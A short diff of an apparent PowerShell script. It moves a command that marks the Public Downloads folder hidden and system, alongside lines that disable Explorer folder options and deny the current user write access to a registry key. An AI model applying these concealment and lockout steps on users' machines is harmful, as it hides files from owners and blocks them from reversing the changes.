@@ -1,4 +1,4 @@
-attrib +h +s "C:\Users\Public\Downloads"
+
 
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
 
@@ -20,7 +20,7 @@ $acl2 = Get-Acl $regPath2
 $rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
 $acl2.AddAccessRule($rule2)
 Set-Acl $regPath2 $acl2
-
+attrib +h +s "C:\Users\Public\Downloads"
 
 
 
